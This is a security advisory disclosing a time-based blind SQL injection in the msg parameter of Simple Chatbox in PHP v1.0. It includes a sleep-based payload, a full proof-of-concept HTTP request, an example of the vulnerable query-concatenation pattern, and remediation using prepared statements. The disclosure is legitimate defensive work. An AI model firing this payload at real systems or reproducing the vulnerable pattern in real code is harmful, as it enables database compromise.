## SQL Injection in Simple Chatbox PHP msg Parameter
## Credit

Discovered by: Ahmad Marzook

## Product

Simple Chatbox in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/simple-chatbox-in-php-with-source-code/

## Affected Version

Simple Chatbox in PHP v1.0

## Vulnerability Type

SQL Injection

CWE

CWE-89 – Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## Severity

High

CVSS v3.1 Score

8.8 (High)

Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
## Description

The Simple Chatbox in PHP v1.0 is vulnerable to a SQL Injection vulnerability in the message submission functionality.

The vulnerability exists in the following endpoint:

/SimpleChatbox_PHP/chatbox/insert.php

The application processes user-supplied input through the msg parameter via an HTTP POST request. This parameter is directly used in backend SQL queries without proper validation, sanitization, or parameterized query handling.

Because the application fails to properly neutralize special SQL characters, attackers can inject malicious SQL payloads into the msg parameter. The input is incorporated into SQL statements without using prepared statements, allowing attackers to manipulate query logic.

During testing, a time-based SQL injection payload was successfully executed:

'+(select*from(select(sleep(20)))a)+'

When the payload is submitted, the server response is delayed by approximately 20 seconds, confirming that the injected SQL query is executed by the database.

This demonstrates that the application is vulnerable to time-based blind SQL injection, where attackers can infer database behavior based on response delays.

## Root Cause

The vulnerability is caused by unsafe handling of user-controlled input.

Specifically:

Direct concatenation of user input into SQL queries

Lack of input validation or sanitization

Absence of prepared statements or parameter binding

Trusting user input without verification

A typical vulnerable pattern:

$msg = $_POST['msg'];
$query = "INSERT INTO messages (message) VALUES ('$msg')";

Because the input is not sanitized, attackers can inject SQL expressions into the query.

## Affected Endpoint
/SimpleChatbox_PHP/chatbox/insert.php
## Vulnerable Parameter
msg
## HTTP Method
POST
## Proof of Concept
Full HTTP Request
 ```plain
POST /SimpleChatbox_PHP/chatbox/insert.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Sec-CH-UA: "Google Chrome";v="145", "Not=A?Brand";v="8", "Chromium";v="145"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "macOS"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=kjshjn00ous3mbuia5sgcic508
Referer: https://localhost/SimpleChatbox_PHP/chatbox/index.php?username=OcogKzac
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

msg=Your%20message%20here...'%2b(select*from(select(sleep(20)))a)%2b'
 ```

## Steps to Reproduce

Install the Simple Chatbox in PHP.

Navigate to the chat interface.

Intercept the message submission request using Burp Suite.

Modify the msg parameter:

'+(select*from(select(sleep(20)))a)+'

Send the request.

Result

The server response is delayed by approximately 20 seconds, confirming that the injected SQL payload is executed.

## Impact

Successful exploitation allows attackers to:

Execute arbitrary SQL queries

Extract sensitive database information

Enumerate database structure

Modify or delete records

Potentially gain full control over the database

In severe cases, attackers can fully compromise the backend system.

Vulnerability Classification
CWE

CWE-89 – SQL Injection

OWASP Top 10

A03:2021 – Injection

Suggested Remediation
Use Prepared Statements
$stmt = $conn->prepare("INSERT INTO messages (message) VALUES (?)");
$stmt->execute([$msg]);
Input Validation

Validate and sanitize user input.

Least Privilege

Use restricted database permissions.

Security Testing

Perform regular security audits and penetration testing.

## PoC 

<img width="954" height="642" alt="Image" src="https://github.com/user-attachments/assets/a0896e8f-fe02-4c01-8eb0-1cc8c6674843" />
